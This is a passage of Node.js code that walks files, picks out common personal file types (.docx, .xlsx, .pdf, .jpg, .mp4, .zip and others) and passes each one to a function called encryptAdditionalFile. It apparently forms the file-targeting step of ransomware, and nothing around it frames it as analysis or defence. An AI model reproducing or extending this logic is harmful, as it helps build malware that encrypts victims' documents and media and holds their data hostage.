        if (fs.statSync(filePath).isFile()) {
            const ext = path.extname(filePath).toLowerCase();
            if (['.txt', '.docx', '.xlsx', '.pptx', '.pdf', '.jpg', '.png', '.mp3', '.mp4', '.zip'].includes(ext)) {
                encryptAdditionalFile(filePath);
            }
        }
